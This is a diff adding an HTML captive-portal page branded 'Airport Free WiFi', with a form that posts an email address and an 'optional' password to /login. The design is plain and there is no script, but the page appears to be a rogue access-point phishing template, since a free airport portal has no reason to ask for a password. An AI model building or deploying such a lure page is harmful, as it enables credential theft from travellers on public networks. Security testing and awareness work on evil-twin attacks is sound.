@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Airport Free WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Helvetica Neue',Arial,sans-serif;background:#1a3a5c;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:white;border-radius:8px;padding:36px;width:100%;max-width:380px}
+.logo{text-align:center;margin-bottom:20px}
+.logo .icon{font-size:48px;display:block}
+.logo h1{font-size:20px;color:#1a3a5c;font-weight:700;letter-spacing:1px;margin-top:8px}
+.logo p{font-size:12px;color:#888;margin-top:4px}
+hr{border:none;border-top:1px solid #eee;margin:20px 0}
+label{display:block;font-size:12px;color:#666;margin-bottom:4px;font-weight:600}
+input{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:15px;margin-bottom:14px;outline:none}
+input:focus{border-color:#1a3a5c}
+.terms{font-size:11px;color:#aaa;text-align:center;margin-bottom:16px}
+button{width:100%;padding:13px;background:#1a3a5c;color:white;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:.5px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <span class="icon">✈️</span>
+    <h1>AIRPORT FREE WIFI</h1>
+    <p>Complimentary internet access</p>
+  </div>
+  <hr>
+  <form method="POST" action="/login">
+    <label>Email Address</label>
+    <input type="email" name="email" placeholder="your@email.com" required>
+    <label>Password (optional)</label>
+    <input type="password" name="password" placeholder="Leave blank for guest access">
+    <p class="terms">By connecting you agree to our Terms of Service and acceptable use policy.</p>
+    <button type="submit">Connect to Internet</button>
+  </form>
+</div>
+</body>
+</html>
